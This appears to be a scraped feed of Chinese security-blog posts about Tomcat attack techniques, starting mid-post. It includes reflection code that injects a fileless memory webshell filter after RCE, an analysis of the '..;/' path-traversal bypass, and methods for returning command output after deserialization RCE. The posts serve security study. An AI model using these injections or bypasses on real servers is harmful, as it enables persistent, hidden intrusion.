class="line">EnumSet&lt;DispatcherType&gt; typeEnumSet = EnumSet.of(DispatcherType.REQUEST);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(typeEnumSet, <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 利用前文获取的StandardContext。强行反射修改filterConfig</span></span><br><span class="line">Field filterConfigField = StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfig = (HashMap) filterConfigField.get(standardContext);</span><br><span class="line">System.out.println(filterConfig);</span><br><span class="line"></span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilter(ef);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;ef&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(ef.getClass().getName());</span><br><span class="line">filterDef.setAsyncSupported(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;ApplicationFilterConfig&gt; applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">applicationFilterConfigConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">filterConfig.put(<span class="string">&quot;ef&quot;</span>, applicationFilterConfig);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] 重置LifecycleBase.state</span></span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTED);</span><br></pre></td></tr></table></figure><p>效果：</p><img src="/2022/07/07/2022-07-07-java-memory-shell/1.gif" style="zoom: 80%;"><h3 id="实战内存马角度"><a href="#实战内存马角度" class="headerlink" title="实战内存马角度"></a>实战内存马角度</h3><p>三梦师傅用的是“修改程序逻辑，初始化静态变量”这种方式拿request，然后顺利拿到context的。但由于这种方式对于Filter类型的程序不太友好，下文使用“Tomcat7另一个静态变量”这种方式，来获取context。</p><p>打内存马，最常用的就是<code>defineClass()</code>。那我们来实现下。整一个具有CC11依赖的Tomcat。</p><p>CC11是用<code>TemplatesImpl</code>来<code>defineClass()</code>的。但是这里有一个小坑。我们来看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="comment">//新建了一个ClassLoader</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">         <span class="comment">//使用新建的ClassLoader来defineClass()</span></span><br><span class="line">         _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java中类加载机制是双亲委派，一般的例如<code>new XXX()</code>这种，都是用的Java启动时创建的ClassLoader来加载的。类实例会保存在ClassLoader中。但我们看到<code>TemplatesImpl</code>，它去<code>defineClass()</code>是用新建的ClassLoader加载类。类实例只会保存在这个新建的ClassLoader中。但找了一圈，并没有发现程序其他地方有存储这个<code>loader</code>的点。所以如果我们用<code>TemplatesImpl</code>进行了<code>defineClass()</code>，是没法在外面用<code>Class.forName()</code>拿到加载的类实例的。</p><p>要动态注册FIlter，需要ApplicaationContext，但我们手头只有StandContenxt。这个可以不可以加Filter呢？</p><p>直接断点打在Filter中，回溯看。找到*ApplicationFilterChain#internalDoFilter()*。很明显可以看到几个关键属性：<code>filters</code>, <code>filterConfig</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">    Filter filter = filterConfig.getFilter();</span><br><span class="line">    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>继续往前看，这些东西是哪里被赋值的呢？找到*StandardWrapperValve#invoke()*。有一行：Filter的调用都是根据<code>filterChain</code>的值，进行依次调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ApplicationFilterChain filterChain =</span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>找找<code>filterChain</code>如何被赋值的</p><p><em>ApplicationFilterFactory#createFilterChain()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">StandardContext context = (StandardContext) wrapper.getParent();</span><br><span class="line">FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">     ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在*filterChain.addFilter()*中，即存在本小节开头说的，几个关键属性的赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filters[n++] = filterConfig;</span><br></pre></td></tr></table></figure><p>看到这里。可以整理出流程：</p><ol><li>在每一个request进来时，都会进入<em>StandardWrapperValve#invoke()<em>。该方法会调用</em>ApplicationFilterFactory.createFilterChain</em>组装<code>filterChain</code></li><li><code>filterChain</code>根据<code>StandardContext.filterMaps</code>和<code>StandardContext.filterConfigs</code>组装</li><li>组装完毕后，根据<code>filterChain</code>，依次进行Filter的调用</li></ol><p>那么我们的控制思路就是：由于可获取<code>StandardContext</code>，基于<code>StandardContext</code>反射修改<code>filterMaps</code>。以此将内存马打入</p><p>为了适配不同版本的Tomcat。需要额外进行些处理。</p><p><strong>Tomcat6</strong></p><p>FilterDef有点不一样，没用setFilter()。他是根据FIlterClass动态加载的</p><p><em>ApplicationFilterFactory#createFilterChain()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isCometFilter = filterConfig.getFilter() <span class="keyword">instanceof</span> CometFilter; <span class="comment">//根据filterDef.filterClass动态ClassLoader加载</span></span><br><span class="line">filterChain.addFilter(filterConfig);</span><br></pre></td></tr></table></figure><p>直接反射设置<em>ApplicationFilterConfig.filter</em>不就可了嘛</p><p><strong>Tomcat7</strong></p><p>包名不一样 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.catalina.deploy.FilterDef;</span><br></pre></td></tr></table></figure><p><strong>Tomcat8</strong>/9</p><p>包名不一样 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br></pre></td></tr></table></figure><p><strong>Tomcat10</strong></p><p>整个包名都变了，由<code>javax.servlet.*</code>变成了<code>jakarta.servlet.*</code>。暂时没想到该如何通用。只能单独另开一个内存马payload.</p><p>基于前文 ”Tomcat7另一个静态变量“ 中。可以发现，<code>catalina</code>变量中存放了很多有价值的信息。在这其中我们能拿到<strong>任意</strong>Webapp的<em>type=Manager</em>的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;context=/tomcat1_war_exploded,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3592</span>&#125; </span><br><span class="line"><span class="string">&quot;context=/manager,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3676</span>&#125; </span><br></pre></td></tr></table></figure><p>里头的<code>resource.context.context</code>就是当前webapp的<code>ApplicationContext</code>。</p><p>要拿到当前webapp的<code>ApplicationContext</code>，我们还要简单判断一下当前webapp的<code>context path</code>。不然会拿到其他webapp的<code>ApplicationContext</code></p><p>可以基于前文”Tomcat7另一个静态变量“ 的代码，通过<code>RequestGroupInfo</code>获取当前请求路径，拼接获取webapp的<em>type=Manager</em>信息。</p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>建好一个Servlet打断点往上看。看看Tomcat内部是如何处理一个Servlet的</p><p><em>ApplicationFilterChain#internalDoFilter()</em> </p><p><code>Servlet</code>实例保存在<code>servlet</code>中，追溯<code>servlet</code>赋值点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet.service(request, response);</span><br></pre></td></tr></table></figure><p><em>StandardWrapperValve#invoke()</em></p><p>但其实<code>wrapper</code>里早就有<code>Servlet</code>的实例了。继续追溯<code>wrapper</code>的赋值点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet = wrapper.allocate();</span><br></pre></td></tr></table></figure><p><em>StandardWrapperValve#invoke()</em></p><p>实际是<em>ValveBase.container</em>早就存放了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrapper = (StandardWrapper) getContainer();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.mappingData.wrapper</span><br></pre></td></tr></table></figure><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>代码丢github备份了。写的很烂就不公开了。想瞄瞄的话问小盘盘要吧。</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://www.anquanke.com/post/id/198886">基于内存 Webshell 的无文件攻击技术研究</a></p><p><a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文写的很垃圾，建议学过基本的之后，当笔记看就好了。本文写了点可能比较新奇的东西。&lt;/p&gt;
&lt;p&gt;想认真学的还是去看文末的Ref吧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;前提：和回显类似。得先RCE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;好处：规避静态文件的查杀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;Java Web不像apache + php模式，每一次请求都是生成新的php实例。Java Web是长期运行的（同理的还有.net、go、python这些）。Web程序必定会有相关的变量、逻辑进行请求分发的操作。当我们RCE之后，若能控制进行请求分发的变量，便能控制请求分发的逻辑。&lt;/p&gt;
&lt;p&gt;常见的操作有：新增控制器、修改控制器、添加拦截器等&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>关于path variables ;的解析及经典..;/的成因</title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-path-variables/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-path-variables/</id>
    <published>2022-07-07T15:24:00.000Z</published>
    <updated>2022-07-07T16:17:00.512Z</updated>
    
    <content type="html"><![CDATA[<p>关于 path variables ; 的解析及经典<code>..;/</code>的成因</p><span id="more"></span><p><a href="https://datatracker.ietf.org/doc/html/rfc6570#section-3.2.1">RFC文档</a>中关于 path expansion 的描述中，有下面的模板例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Type    Separator</span><br><span class="line">         &quot;,&quot;     (default)</span><br><span class="line">+        &quot;,&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">&quot;,&quot;</span></span></span><br><span class="line">.        &quot;.&quot;</span><br><span class="line">/        &quot;/&quot;</span><br><span class="line">;        &quot;;&quot;</span><br><span class="line">?        &quot;&amp;&quot;</span><br><span class="line">&amp;        &quot;&amp;&quot;</span><br><span class="line"></span><br><span class="line">Example Template     Expansion</span><br><span class="line">&#123;count&#125;            one,two,three</span><br><span class="line">&#123;count*&#125;           one,two,three</span><br><span class="line">&#123;/count&#125;           /one,two,three</span><br><span class="line">&#123;/count*&#125;          /one/two/three</span><br><span class="line">&#123;;count&#125;           ;count=one,two,three</span><br><span class="line">&#123;;count*&#125;          ;count=one;count=two;count=three</span><br><span class="line">&#123;?count&#125;           ?count=one,two,three</span><br><span class="line">&#123;?count*&#125;          ?count=one&amp;count=two&amp;count=three</span><br><span class="line">&#123;&amp;count*&#125;          &amp;count=one&amp;count=two&amp;count=three</span><br></pre></td></tr></table></figure><p>而 <code>/path;key=value</code> 是一种Path variables的形式，类似最常见的<code>?key=value</code>。Tomcat对其的解析在<code>CoyoteAdapter#parsePathParameters()</code></p><p>关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parsePathParameters</span><span class="params">(org.apache.coyote.Request req,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   Request request)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    req.decodedURI().toBytes();</span><br><span class="line">    ByteChunk uriBC = req.decodedURI().getByteChunk();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//从URI中找到第一个;</span></span><br><span class="line">    <span class="keyword">int</span> semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (semicolon == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取多个;key=value</span></span><br><span class="line">    <span class="keyword">while</span> (semicolon &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//确定;key=value的右边界</span></span><br><span class="line">        <span class="keyword">int</span> start = uriBC.getStart();</span><br><span class="line">        <span class="keyword">int</span> end = uriBC.getEnd();</span><br><span class="line">        <span class="keyword">int</span> pathParamStart = semicolon + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//[!] 确定右边界时，边界分隔符是;或/</span></span><br><span class="line">        <span class="keyword">int</span> pathParamEnd = ByteChunk.findBytes(uriBC.getBuffer(),</span><br><span class="line">                                               start + pathParamStart, end,</span><br><span class="line">                                               <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        String pv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (pathParamEnd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//从/path;key=value.... 中提取key=value</span></span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="keyword">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> String(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                                pathParamEnd - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//[+]取/path;key=value... 中...的部分，抹除掉原URI的;key=value，将...拼接到/path后面</span></span><br><span class="line">            <span class="keyword">byte</span>[] buf = uriBC.getBuffer();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; end - start - pathParamEnd; i++) &#123;</span><br><span class="line">                buf[start + semicolon + i]</span><br><span class="line">                    = buf[start + i + pathParamEnd];</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setBytes(buf, start,</span><br><span class="line">                           end - start - pathParamEnd + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//没边界了，结束提取key=value</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="keyword">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> String(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                                (end - start) - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setEnd(start + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析key=value，分开key和value</span></span><br><span class="line">        <span class="keyword">if</span> (pv != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> equals = pv.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (equals &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                String name = pv.substring(<span class="number">0</span>, equals);</span><br><span class="line">                String value = pv.substring(equals + <span class="number">1</span>);</span><br><span class="line">                request.addPathParameter(name, value);</span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;equals&quot;</span>,</span><br><span class="line">                                           String.valueOf(equals)));</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;name&quot;</span>,</span><br><span class="line">                                           name));</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;value&quot;</span>,</span><br><span class="line">                                           value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果有多个;key=value，继续找</span></span><br><span class="line">        semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, semicolon);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中尤为关注带<code>[+]</code>注释的代码，这些代码是<code>..;/</code>会被tomcat认为是<code>../</code>的关键。</p><p>首先判断path variables的右边界是<code>/</code>，这样我们可以构造形如<code>/path;key=value/;key=value</code>的形式</p><p>下面将<code>;key=value</code>抹除，将后面的字符串拼接上去。类似下面这样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URI</span><br><span class="line">/path;key=value/;key=value -&gt;</span><br><span class="line">/path/;key=value -&gt;</span><br><span class="line">/path/</span><br></pre></td></tr></table></figure><p>结合上面两种特性，可以发现URI中有”被替换”和”拼接”的操作。这两种操作组合起来容易衍生出”绕过“、”预期不符“、”解析不一致“的问题。所以当我们传入了这样的URI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/..;/</span><br></pre></td></tr></table></figure><p>由于<code>;</code>和<code>/</code>之间没东西，又会被抹去<code>;</code>。最终URI会变成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/../</span><br></pre></td></tr></table></figure><p>PS：看代码的时候，思路一定不能被他原本的功能限制住了，梳理好功能后一定要跳出来看，结合功能的场景（比如这里path variables是在URI上的）发散思考。</p><h1 id="Rerference"><a href="#Rerference" class="headerlink" title="Rerference"></a>Rerference</h1><p><a href="https://www.youtube.com/watch?v=CIhHpkybYsY">https://www.youtube.com/watch?v=CIhHpkybYsY</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于 path variables ; 的解析及经典&lt;code&gt;..;/&lt;/code&gt;的成因&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/categories/java/Tomcat/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>java回显</title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-echo/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-echo/</id>
    <published>2022-07-07T15:23:00.000Z</published>
    <updated>2022-07-07T16:16:36.610Z</updated>
    
    <content type="html"><![CDATA[<p>所谓回显。根据各师傅的文章所说。现有的大多数是用defineClass 或 URLClassLoader。加载恶意类并执行。恶意类中进行例如报错、写数据、开RMI通信、等这些操作。就回显了。</p><p>不，其实，涉及到内存马加载，都要用这。</p><p>反序列化回显，一般都是依靠最终的代码执行点，执行到defineClass或URLClassLoader。，RCE嘛，咱想怎么操作就怎么操作。</p><span id="more"></span><h1 id="RMI方式回显"><a href="#RMI方式回显" class="headerlink" title="RMI方式回显"></a>RMI方式回显</h1><p>RMI Bind Echo时要注意：类型转换时，只能转换成接口类型。不能转换成类类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//使用接口类型来接，可成</span></span><br><span class="line">        com.interfa.D1 o1 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用实现类来接，会报错</span></span><br><span class="line">        com.interfa.impl.D1Server o2 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，我们传给<code>defineClass</code>来还原类时，一次只能传一个类。没法将本地自定义接口传上去。</p><p>虽说这个报错是客户端的报错。照理说我们仿写一下发送逻辑，就可以规避这些问题？</p><p>不。不可以。RMI服务端在调用方法时，是根据接口定义的方法，来生成MethodHash的。普通的Remote接口中没有定义方法，所以最终的MethodHashMap是空的。没法成功调用方法。</p><p>所以，我们需要在服务端上找一个<strong>继承了Remote的接口</strong>，并且该接口能接受参数（命令传参），存在返回值（命令回显）。</p><p>在原生JDk中，找到如下接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">RMIConnection</span><br><span class="line">    方法: invoke()</span><br><span class="line">    传参: String</span><br><span class="line">    返回值: Object</span><br><span class="line"></span><br><span class="line">Activator    </span><br><span class="line">方法: activate()</span><br><span class="line">    传参: ActivationID - 硬生生构造应该也行。但是太长了哈哈哈。不考虑</span><br><span class="line">    返回值: MarshalledObject - <span class="keyword">byte</span>[] objBytes可存储数据</span><br><span class="line">        </span><br><span class="line">RMIServer</span><br><span class="line">方法: newClient()</span><br><span class="line">    传参: Object</span><br><span class="line">    返回值: RMIConnection - RMIConnectionImpl实现类中有属性String connectionId 可存储数据</span><br><span class="line">    </span><br><span class="line">DGC</span><br><span class="line">方法: dirty()</span><br><span class="line">    传参: Lease - VMID属性里有<span class="keyword">byte</span>[] addr可存储数据</span><br><span class="line">    返回值: Lease - VMID属性里有<span class="keyword">byte</span>[] addr可存储数据</span><br><span class="line"></span><br><span class="line">ActivationSystem</span><br><span class="line">    方法: setActivationDesc()</span><br><span class="line">    传参: ActivationDesc - String className属性可存储数据</span><br><span class="line">    返回值: ActivationDesc - String className属性可存储数据</span><br><span class="line">        </span><br><span class="line">ActivationInstantiator</span><br><span class="line">    方法: newInstance()</span><br><span class="line">    传参: ActivationDesc - String className属性可存储数据</span><br><span class="line">    返回值: MarshalledObject&lt;? extends Remote&gt; - <span class="keyword">byte</span>[] objBytes属性可存储数据</span><br></pre></td></tr></table></figure><p>虽说大部分接口的返回值不是String。传入的参数也不是String。但只要参数对象中，存在String、byte[]这两种类型的属性。就可以存放命令执行的回显。</p><p>或者，目标没有RMI。我们可以自创一个RMI Server。只需要修改下恶意类，改成<code>LocateRegistry.createRegistry()</code>就好了。这里不赘述了。</p><p>用CC2的话。一直反射Invoke，也是可的。只是麻烦点。这里就不写啦哈哈哈。</p><h1 id="Tomcat回显"><a href="#Tomcat回显" class="headerlink" title="Tomcat回显"></a>Tomcat回显</h1><p>主要的方法：</p><ol><li>报错回显</li><li>拿response对象</li><li>Linux下拿<code>/proc/self/fd/i</code>。控制文件描述符作回显</li></ol><p>SpringMVC中用Tomcat回显，有些小问题。因为Controller逻辑中设置了response后，SpringMvc会再处理一边</p><p>解决思路：在Controller中就调用<code>Response#finishResponse</code>。强制返回。</p><p>但不管怎么样。在SpringMVC中强行设置response。会留下一个报错日志。不太优雅哈哈哈</p><p>日志信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: getWriter() has already been called for this response</span><br></pre></td></tr></table></figure><h2 id="修改程序逻辑，初始化静态变量"><a href="#修改程序逻辑，初始化静态变量" class="headerlink" 